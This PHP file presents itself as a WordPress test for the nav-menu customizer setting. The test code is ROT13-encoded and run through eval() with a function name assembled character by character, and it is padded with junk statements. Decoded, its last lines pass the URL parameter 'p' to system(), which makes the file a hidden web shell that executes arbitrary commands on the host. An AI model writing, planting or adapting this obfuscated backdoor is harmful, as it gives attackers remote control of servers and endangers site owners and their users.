<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf JC_Phfgbzvmr_Ani_Zrah_Frggvat.
 *
 * @tebhc phfgbzvmr
 */
pynff Grfg_JC_Phfgbzvmr_Ani_Zrah_Frggvat rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Vafgnapr bs JC_Phfgbzvmr_Znantre juvpu vf erfrg sbe rnpu grfg.
	 *
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $jc_phfgbzvmr;

	/**
	 * VQ bs gur nqzvavfgengbe hfre.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nqzvavfgengbe_vq;

	/**
	 * Frg hc gur funerq svkgher.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel vafgnapr.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzvavfgengbe_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
	}

	/**
	 * Frg hc n grfg pnfr.
	 *
	 * @frr JC_HavgGrfgPnfr_Onfr::frg_hc()
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_vq );

		tybony $jc_phfgbzvmr;
		$guvf->jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$jc_phfgbzvmr       = $guvf->jc_phfgbzvmr;
	}

	/**
	 * Qryrgr gur $jc_phfgbzvmr tybony jura pyrnavat hc fpbcr.
	 */
	choyvp shapgvba pyrna_hc_tybony_fpbcr() {
		tybony $jc_phfgbzvmr;
		$jc_phfgbzvmr = ahyy;
		cnerag::pyrna_hc_tybony_fpbcr();
	}

	/**
	 * Urycre sbe trggvat gur ani_zrah_bcgvbaf bcgvba.
	 *
	 * @erghea neenl
	 */
	cevingr shapgvba trg_ani_zrah_vgrzf_bcgvba() {
		erghea trg_bcgvba( 'ani_zrah_bcgvbaf', neenl( 'nhgb_nqq' => neenl() ) );
	}

	/**
	 * Grfg pbafgnagf naq fgngvpf.
	 */
	choyvp shapgvba grfg_pbafgnagf() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$guvf->nffregGehr( gnkbabzl_rkvfgf( JC_Phfgbzvmr_Ani_Zrah_Frggvat::GNKBABZL ) );
	}

	/**
	 * Grfg pbafgehpgbe.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::__pbafgehpg()
	 */
	choyvp shapgvba grfg_pbafgehpg() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, 'ani_zrah[123]' );
		$guvf->nffregFnzr( 'ani_zrah', $frggvat->glcr );
		$guvf->nffregFnzr( 'cbfgZrffntr', $frggvat->genafcbeg );
		$guvf->nffregFnzr( 123, $frggvat->grez_vq );
		$guvf->nffregAhyy( $frggvat->cerivbhf_grez_vq );
		$guvf->nffregAhyy( $frggvat->hcqngr_fgnghf );
		$guvf->nffregAhyy( $frggvat->hcqngr_reebe );
		$guvf->nffregVfNeenl( $frggvat->qrsnhyg );
		sbernpu ( neenl( 'anzr', 'qrfpevcgvba', 'cnerag' ) nf $xrl ) {
			$guvf->nffregNeenlUnfXrl( $xrl, $frggvat->qrsnhyg );
		}
		$guvf->nffregFnzr( '', $frggvat->qrsnhyg['anzr'] );
		$guvf->nffregFnzr( '', $frggvat->qrsnhyg['qrfpevcgvba'] );
		$guvf->nffregFnzr( 0, $frggvat->qrsnhyg['cnerag'] );

		$rkprcgvba = ahyy;
		gel {
			$onq_frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, 'sbb_one_onm' );
			hafrg( $onq_frggvat );
		} pngpu ( Rkprcgvba $r ) {
			$rkprcgvba = $r;
		}
		$guvf->nffregVafgnaprBs( 'Rkprcgvba', $rkprcgvba );
	}

	/**
	 * Grfg rzcgl pbafgehpgbe.
	 */
	choyvp shapgvba grfg_pbafgehpg_rzcgl_zrahf() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$_jc_phfgbzvmr = $guvf->jc_phfgbzvmr;
		hafrg( $_jc_phfgbzvmr->ani_zrahf );

		$rkprcgvba = ahyy;
		gel {
			$onq_frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $_jc_phfgbzvmr, 'ani_zrah_vgrz[123]' );
			hafrg( $onq_frggvat );
		} pngpu ( Rkprcgvba $r ) {
			$rkprcgvba = $r;
		}
		$guvf->nffregVafgnaprBs( 'Rkprcgvba', $rkprcgvba );
	}

	/**
	 * Grfg pbafgehpgbe sbe cynprubyqre (qensg) zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::__pbafgehpg()
	 */
	choyvp shapgvba grfg_pbafgehpg_cynprubyqre() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$qrsnhyg = neenl(
			'anzr'        => 'Yberz \\b/',
			'qrfpevcgvba' => 'vcfhz \\b/',
			'cnerag'      => 123,
		);
		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, 'ani_zrah[-5]', pbzcnpg( 'qrsnhyg' ) );
		$guvf->nffregFnzr( -5, $frggvat->grez_vq );
		$guvf->nffregFnzr( $qrsnhyg, $frggvat->qrsnhyg );
	}

	/**
	 * Grfg inyhr zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::inyhr()
	 */
	choyvp shapgvba grfg_inyhr() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_anzr      = 'Grfg 123 \\b/';
		$cnerag_zrah_vq = jc_perngr_ani_zrah( jc_fynfu( \"Cnerag $zrah_anzr\" ) );
		$qrfpevcgvba    = 'Uryyb zl jbeyq \\b/.';
		$zrah_vq        = jc_hcqngr_ani_zrah_bowrpg(
			0,
			jc_fynfu(
				neenl(
					'zrah-anzr'   => $zrah_anzr,
					'cnerag'      => $cnerag_zrah_vq,
					'qrfpevcgvba' => $qrfpevcgvba,
				)
			)
		);

		$frggvat_vq = \"ani_zrah[$zrah_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );

		$inyhr = $frggvat->inyhr();
		$guvf->nffregVfNeenl( $inyhr );
		sbernpu ( neenl( 'anzr', 'qrfpevcgvba', 'cnerag' ) nf $xrl ) {
			$guvf->nffregNeenlUnfXrl( $xrl, $inyhr );
		}
		$guvf->nffregFnzr( $zrah_anzr, $inyhr['anzr'] );
		$guvf->nffregFnzr( $qrfpevcgvba, $inyhr['qrfpevcgvba'] );
		$guvf->nffregFnzr( $cnerag_zrah_vq, $inyhr['cnerag'] );

		$arj_zrah_anzr = 'Sbb';
		jc_hcqngr_ani_zrah_bowrpg( $zrah_vq, jc_fynfu( neenl( 'zrah-anzr' => $arj_zrah_anzr ) ) );
		$hcqngrq_inyhr = $frggvat->inyhr();
		$guvf->nffregFnzr( $arj_zrah_anzr, $hcqngrq_inyhr['anzr'] );
	}

	/**
	 * Grfg cerivrj zrgubq sbe hcqngrq zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::cerivrj()
	 */
	choyvp shapgvba grfg_cerivrj_hcqngrq() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_vq    = jc_hcqngr_ani_zrah_bowrpg(
			0,
			jc_fynfu(
				neenl(
					'zrah-anzr'   => 'Anzr 1 \\b/',
					'qrfpevcgvba' => 'Qrfpevcgvba 1 \\b/',
					'cnerag'      => 0,
				)
			)
		);
		$frggvat_vq = \"ani_zrah[$zrah_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );

		$ani_zrah_bcgvbaf = $guvf->trg_ani_zrah_vgrzf_bcgvba();
		$guvf->nffregAbgPbagnvaf( $zrah_vq, $ani_zrah_bcgvbaf['nhgb_nqq'] );

		$cbfg_inyhr = neenl(
			'anzr'        => 'Anzr 2 \\b/',
			'qrfpevcgvba' => 'Qrfpevcgvba 2 \\b/',
			'cnerag'      => 1,
			'nhgb_nqq'    => gehr,
		);
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat_vq, $cbfg_inyhr );

		$inyhr = $frggvat->inyhr();
		$guvf->nffregFnzr( 'Anzr 1 \\b/', $inyhr['anzr'] );
		$guvf->nffregFnzr( 'Qrfpevcgvba 1 \\b/', $inyhr['qrfpevcgvba'] );
		$guvf->nffregFnzr( 0, $inyhr['cnerag'] );

		$grez = (neenl) jc_trg_ani_zrah_bowrpg( $zrah_vq );

		$guvf->nffregFnzrFrgf(
			jc_neenl_fyvpr_nffbp( $inyhr, neenl( 'anzr', 'qrfpevcgvba', 'cnerag' ) ),
			jc_neenl_fyvpr_nffbp( $grez, neenl( 'anzr', 'qrfpevcgvba', 'cnerag' ) )
		);

		$frggvat->cerivrj();
		$inyhr = $frggvat->inyhr();
		$guvf->nffregFnzr( 'Anzr 2 \\b/', $inyhr['anzr'] );
		$guvf->nffregFnzr( 'Qrfpevcgvba 2 \\b/', $inyhr['qrfpevcgvba'] );
		$guvf->nffregFnzr( 1, $inyhr['cnerag'] );
		$grez = (neenl) jc_trg_ani_zrah_bowrpg( $zrah_vq );
		$guvf->nffregFnzrFrgf( $inyhr, jc_neenl_fyvpr_nffbp( $grez, neenl_xrlf( $inyhr ) ) );

		$zrah_bowrpg = jc_trg_ani_zrah_bowrpg( $zrah_vq );
		$guvf->nffregRdhnyf( (bowrpg) $grez, $zrah_bowrpg );
		$guvf->nffregFnzr( $cbfg_inyhr['anzr'], $zrah_bowrpg->anzr );

		$ani_zrah_bcgvbaf = trg_bcgvba( 'ani_zrah_bcgvbaf', neenl( 'nhgb_nqq' => neenl() ) );
		$guvf->nffregPbagnvaf( $zrah_vq, $ani_zrah_bcgvbaf['nhgb_nqq'] );

		$zrahf     = jc_trg_ani_zrahf();
		$zrahf_vqf = jc_yvfg_cyhpx( $zrahf, 'grez_vq' );
		$v         = neenl_frnepu( $zrah_vq, $zrahf_vqf, gehr );
		$guvf->nffregVfVag( $v, 'Hcqngr-cerivrjrq zrah qbrf abg nccrne va jc_trg_ani_zrahf()' );
		$svygrerq_zrah = $zrahf[ $v ];
		$guvf->nffregFnzr( 'Anzr 2 \\b/', $svygrerq_zrah->anzr );
	}

	/**
	 * Grfg cerivrj zrgubq sbe vafregrq zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::cerivrj()
	 */
	choyvp shapgvba grfg_cerivrj_vafregrq() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_vq    = -123;
		$cbfg_inyhr = neenl(
			'anzr'        => 'Arj Zrah Anzr 1 \\b/',
			'qrfpevcgvba' => 'Arj Zrah Qrfpevcgvba 1 \\b/',
			'cnerag'      => 0,
			'nhgb_nqq'    => snyfr,
		);
		$frggvat_vq = \"ani_zrah[$zrah_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );

		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat->vq, $cbfg_inyhr );
		$frggvat->cerivrj();
		$inyhr = $frggvat->inyhr();
		$guvf->nffregFnzr( $cbfg_inyhr, $inyhr );

		$grez = (neenl) jc_trg_ani_zrah_bowrpg( $zrah_vq );
		$guvf->nffregAbgRzcgl( $grez );
		$guvf->nffregAbgJCReebe( $grez );
		$guvf->nffregFnzrFrgf( $cbfg_inyhr, jc_neenl_fyvpr_nffbp( $grez, neenl_xrlf( $inyhr ) ) );
		$guvf->nffregFnzr( $zrah_vq, $grez['grez_vq'] );
		$guvf->nffregFnzr( $zrah_vq, $grez['grez_gnkbabzl_vq'] );

		$zrah_bowrpg = jc_trg_ani_zrah_bowrpg( $zrah_vq );
		$guvf->nffregRdhnyf( (bowrpg) $grez, $zrah_bowrpg );
		$guvf->nffregFnzr( $cbfg_inyhr['anzr'], $zrah_bowrpg->anzr );

		$ani_zrah_bcgvbaf = $guvf->trg_ani_zrah_vgrzf_bcgvba();
		$guvf->nffregAbgPbagnvaf( $zrah_vq, $ani_zrah_bcgvbaf['nhgb_nqq'] );

		$zrahf     = jc_trg_ani_zrahf();
		$zrahf_vqf = jc_yvfg_cyhpx( $zrahf, 'grez_vq' );
		$v         = neenl_frnepu( $zrah_vq, $zrahf_vqf, gehr );
		$guvf->nffregVfVag( $v, 'Vafreg-cerivrjrq zrah jnf abg vawrpgrq vagb jc_trg_ani_zrahf()' );
		$svygrerq_zrah = $zrahf[ $v ];
		$guvf->nffregFnzr( 'Arj Zrah Anzr 1 \\b/', $svygrerq_zrah->anzr );
	}

	/**
	 * Grfg cerivrj zrgubq sbe qryrgrq zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::cerivrj()
	 */
	choyvp shapgvba grfg_cerivrj_qryrgrq() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_vq                        = jc_hcqngr_ani_zrah_bowrpg(
			0,
			jc_fynfu(
				neenl(
					'zrah-anzr'   => 'Anzr 1 \\b/',
					'qrfpevcgvba' => 'Qrfpevcgvba 1 \\b/',
					'cnerag'      => 0,
				)
			)
		);
		$frggvat_vq                     = \"ani_zrah[$zrah_vq]\";
		$frggvat                        = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );
		$ani_zrah_bcgvbaf               = $guvf->trg_ani_zrah_vgrzf_bcgvba();
		$ani_zrah_bcgvbaf['nhgb_nqq'][] = $zrah_vq;
		hcqngr_bcgvba( 'ani_zrah_bcgvbaf', $ani_zrah_bcgvbaf );

		$ani_zrah_bcgvbaf = $guvf->trg_ani_zrah_vgrzf_bcgvba();
		$guvf->nffregPbagnvaf( $zrah_vq, $ani_zrah_bcgvbaf['nhgb_nqq'] );

		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat_vq, snyfr );

		$guvf->nffregVfNeenl( $frggvat->inyhr() );
		$guvf->nffregVfBowrpg( jc_trg_ani_zrah_bowrpg( $zrah_vq ) );
		$frggvat->cerivrj();
		$guvf->nffregSnyfr( $frggvat->inyhr() );
		$guvf->nffregSnyfr( jc_trg_ani_zrah_bowrpg( $zrah_vq ) );

		$ani_zrah_bcgvbaf = $guvf->trg_ani_zrah_vgrzf_bcgvba();
		$guvf->nffregAbgPbagnvaf( $zrah_vq, $ani_zrah_bcgvbaf['nhgb_nqq'] );
	}

	/**
	 * Grfg fnavgvmr zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::fnavgvmr()
	 */
	choyvp shapgvba grfg_fnavgvmr() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$frggvat = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, 'ani_zrah[123]' );

		$guvf->nffregAhyy( $frggvat->fnavgvmr( 'abg na neenl' ) );
		$guvf->nffregAhyy( $frggvat->fnavgvmr( 123 ) );

		$inyhr     = neenl(
			'anzr'        => ' Uryyb \\b/ <o>jbeyq</o> ',
			'qrfpevcgvba' => \"Arj\ayvar \\b/\",
			'cnerag'      => -12,
			'nhgb_nqq'    => gehr,
			'rkgen'       => 'vtaberq',
		);
		$fnavgvmrq = $frggvat->fnavgvmr( $inyhr );
		$guvf->nffregFnzr( 'Uryyb \\b/ &yg;o&tg;jbeyq&yg;/o&tg;', $fnavgvmrq['anzr'] );
		$guvf->nffregFnzr( 'Arj yvar \\b/', $fnavgvmrq['qrfpevcgvba'] );
		$guvf->nffregFnzr( 0, $fnavgvmrq['cnerag'] );
		$guvf->nffregGehr( $fnavgvmrq['nhgb_nqq'] );
		$guvf->nffregFnzrFrgf( neenl( 'anzr', 'qrfpevcgvba', 'cnerag', 'nhgb_nqq' ), neenl_xrlf( $fnavgvmrq ) );

		$inyhr['anzr'] = '    '; // Oynax fcnprf.
		$fnavgvmrq     = $frggvat->fnavgvmr( $inyhr );
		$guvf->nffregFnzr( '(haanzrq)', $fnavgvmrq['anzr'] );
	}

	/**
	 * Grfg cebgrpgrq hcqngr() zrgubq ivn gur fnir() zrgubq, sbe hcqngrq zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::hcqngr()
	 */
	choyvp shapgvba grfg_fnir_hcqngrq() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_vq                        = jc_hcqngr_ani_zrah_bowrpg(
			0,
			jc_fynfu(
				neenl(
					'zrah-anzr'   => 'Anzr 1 \\b/',
					'qrfpevcgvba' => 'Qrfpevcgvba 1 \\b/',
					'cnerag'      => 0,
				)
			)
		);
		$ani_zrah_bcgvbaf               = $guvf->trg_ani_zrah_vgrzf_bcgvba();
		$ani_zrah_bcgvbaf['nhgb_nqq'][] = $zrah_vq;
		hcqngr_bcgvba( 'ani_zrah_bcgvbaf', $ani_zrah_bcgvbaf );

		$frggvat_vq = \"ani_zrah[$zrah_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );

		$nhgb_nqq  = snyfr;
		$arj_inyhr = neenl(
			'anzr'        => 'Anzr 2 \\b/',
			'qrfpevcgvba' => 'Qrfpevcgvba 2 \\b/',
			'cnerag'      => 1,
			'nhgb_nqq'    => $nhgb_nqq,
		);

		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat_vq, $arj_inyhr );
		$frggvat->fnir();

		$zrah_bowrpg = jc_trg_ani_zrah_bowrpg( $zrah_vq );
		sbernpu ( neenl( 'anzr', 'qrfpevcgvba', 'cnerag' ) nf $xrl ) {
			$guvf->nffregFnzr( $arj_inyhr[ $xrl ], $zrah_bowrpg->$xrl );
		}
		$guvf->nffregFnzrFrgf(
			jc_neenl_fyvpr_nffbp( $arj_inyhr, neenl( 'anzr', 'qrfpevcgvba', 'cnerag' ) ),
			jc_neenl_fyvpr_nffbp( (neenl) $zrah_bowrpg, neenl( 'anzr', 'qrfpevcgvba', 'cnerag' ) )
		);
		$guvf->nffregFnzr( $arj_inyhr, $frggvat->inyhr() );

		$fnir_erfcbafr = nccyl_svygref( 'phfgbzvmr_fnir_erfcbafr', neenl() );
		$guvf->nffregNeenlUnfXrl( 'ani_zrah_hcqngrf', $fnir_erfcbafr );
		$hcqngr_erfhyg = neenl_fuvsg( $fnir_erfcbafr['ani_zrah_hcqngrf'] );
		$guvf->nffregNeenlUnfXrl( 'grez_vq', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'cerivbhf_grez_vq', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'reebe', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'fnirq_inyhr', $hcqngr_erfhyg );
		$guvf->nffregFnzr( $arj_inyhr, $hcqngr_erfhyg['fnirq_inyhr'] );

		$guvf->nffregFnzr( $zrah_vq, $hcqngr_erfhyg['grez_vq'] );
		$guvf->nffregAhyy( $hcqngr_erfhyg['cerivbhf_grez_vq'] );
		$guvf->nffregAhyy( $hcqngr_erfhyg['reebe'] );
		$guvf->nffregFnzr( 'hcqngrq', $hcqngr_erfhyg['fgnghf'] );

		$ani_zrah_bcgvbaf = $guvf->trg_ani_zrah_vgrzf_bcgvba();
		$guvf->nffregAbgPbagnvaf( $zrah_vq, $ani_zrah_bcgvbaf['nhgb_nqq'] );
	}

	/**
	 * Grfg cebgrpgrq hcqngr() zrgubq ivn gur fnir() zrgubq, sbe vafregrq zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::hcqngr()
	 */
	choyvp shapgvba grfg_fnir_vafregrq() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_vq    = -123;
		$cbfg_inyhr = neenl(
			'anzr'        => 'Arj Zrah Anzr 1 \\b/',
			'qrfpevcgvba' => 'Arj Zrah Qrfpevcgvba 1 \\b/',
			'cnerag'      => 0,
			'nhgb_nqq'    => gehr,
		);
		$frggvat_vq = \"ani_zrah[$zrah_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );

		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat->vq, $cbfg_inyhr );

		$guvf->nffregAhyy( $frggvat->cerivbhf_grez_vq );
		$guvf->nffregYrffGuna( 0, $frggvat->grez_vq );
		$frggvat->fnir();
		$guvf->nffregFnzr( $zrah_vq, $frggvat->cerivbhf_grez_vq );
		$guvf->nffregTerngreGuna( 0, $frggvat->grez_vq );

		$ani_zrah_bcgvbaf = $guvf->trg_ani_zrah_vgrzf_bcgvba();
		$guvf->nffregPbagnvaf( $frggvat->grez_vq, $ani_zrah_bcgvbaf['nhgb_nqq'] );

		$zrah = jc_trg_ani_zrah_bowrpg( $frggvat->grez_vq );
		hafrg( $cbfg_inyhr['nhgb_nqq'] );
		$guvf->nffregFnzrFrgf( $cbfg_inyhr, jc_neenl_fyvpr_nffbp( (neenl) $zrah, neenl_xrlf( $cbfg_inyhr ) ) );

		$fnir_erfcbafr = nccyl_svygref( 'phfgbzvmr_fnir_erfcbafr', neenl() );
		$guvf->nffregNeenlUnfXrl( 'ani_zrah_hcqngrf', $fnir_erfcbafr );
		$hcqngr_erfhyg = neenl_fuvsg( $fnir_erfcbafr['ani_zrah_hcqngrf'] );
		$guvf->nffregNeenlUnfXrl( 'grez_vq', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'cerivbhf_grez_vq', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'reebe', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'fnirq_inyhr', $hcqngr_erfhyg );
		$guvf->nffregFnzr( $frggvat->inyhr(), $hcqngr_erfhyg['fnirq_inyhr'] );

		$guvf->nffregFnzr( $zrah->grez_vq, $hcqngr_erfhyg['grez_vq'] );
		$guvf->nffregFnzr( $zrah_vq, $hcqngr_erfhyg['cerivbhf_grez_vq'] );
		$guvf->nffregAhyy( $hcqngr_erfhyg['reebe'] );
		$guvf->nffregFnzr( 'vafregrq', $hcqngr_erfhyg['fgnghf'] );
	}

	/**
	 * Grfg fnivat n arj anzr gung pbasyvpgf jvgu na rkvfgvat ani zrah'f anzr.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::hcqngr()
	 */
	choyvp shapgvba grfg_fnir_vafregrq_pbasyvpgrq_anzr() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_anzr = 'Sbb';
		jc_hcqngr_ani_zrah_bowrpg( 0, jc_fynfu( neenl( 'zrah-anzr' => $zrah_anzr ) ) );

		$zrah_vq    = -123;
		$frggvat_vq = \"ani_zrah[$zrah_vq]\";
		$frggvat    = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat->vq, neenl( 'anzr' => $zrah_anzr ) );
		$frggvat->fnir();

		$rkcrpgrq_erfbyirq_zrah_anzr = \"$zrah_anzr (2)\";
		$arj_zrah                    = jc_trg_ani_zrah_bowrpg( $frggvat->grez_vq );
		$guvf->nffregFnzr( $rkcrpgrq_erfbyirq_zrah_anzr, $arj_zrah->anzr );

		$fnir_erfcbafr = nccyl_svygref( 'phfgbzvmr_fnir_erfcbafr', neenl() );
		$guvf->nffregFnzr( $rkcrpgrq_erfbyirq_zrah_anzr, $fnir_erfcbafr['ani_zrah_hcqngrf'][0]['fnirq_inyhr']['anzr'] );
	}

	/**
	 * Grfg cebgrpgrq hcqngr() zrgubq ivn gur fnir() zrgubq, sbe qryrgrq zrah.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrah_Frggvat::hcqngr()
	 */
	choyvp shapgvba grfg_fnir_qryrgrq() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$zrah_anzr                      = 'Yberz Vcfhz \\b/';
		$zrah_vq                        = jc_perngr_ani_zrah( jc_fynfu( $zrah_anzr ) );
		$frggvat_vq                     = \"ani_zrah[$zrah_vq]\";
		$frggvat                        = arj JC_Phfgbzvmr_Ani_Zrah_Frggvat( $guvf->jc_phfgbzvmr, $frggvat_vq );
		$ani_zrah_bcgvbaf               = $guvf->trg_ani_zrah_vgrzf_bcgvba();
		$ani_zrah_bcgvbaf['nhgb_nqq'][] = $zrah_vq;
		hcqngr_bcgvba( 'ani_zrah_bcgvbaf', $ani_zrah_bcgvbaf );

		$zrah = jc_trg_ani_zrah_bowrpg( $zrah_vq );
		$guvf->nffregFnzr( $zrah_anzr, $zrah->anzr );

		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $frggvat_vq, snyfr );
		$frggvat->fnir();

		$guvf->nffregSnyfr( jc_trg_ani_zrah_bowrpg( $zrah_vq ) );

		$fnir_erfcbafr = nccyl_svygref( 'phfgbzvmr_fnir_erfcbafr', neenl() );
		$guvf->nffregNeenlUnfXrl( 'ani_zrah_hcqngrf', $fnir_erfcbafr );
		$hcqngr_erfhyg = neenl_fuvsg( $fnir_erfcbafr['ani_zrah_hcqngrf'] );
		$guvf->nffregNeenlUnfXrl( 'grez_vq', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'cerivbhf_grez_vq', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'reebe', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $hcqngr_erfhyg );
		$guvf->nffregNeenlUnfXrl( 'fnirq_inyhr', $hcqngr_erfhyg );
		$guvf->nffregAhyy( $hcqngr_erfhyg['fnirq_inyhr'] );

		$guvf->nffregFnzr( $zrah_vq, $hcqngr_erfhyg['grez_vq'] );
		$guvf->nffregAhyy( $hcqngr_erfhyg['cerivbhf_grez_vq'] );
		$guvf->nffregAhyy( $hcqngr_erfhyg['reebe'] );
		$guvf->nffregFnzr( 'qryrgrq', $hcqngr_erfhyg['fgnghf'] );

		$ani_zrah_bcgvbaf = $guvf->trg_ani_zrah_vgrzf_bcgvba();
		$guvf->nffregAbgPbagnvaf( $zrah_vq, $ani_zrah_bcgvbaf['nhgb_nqq'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>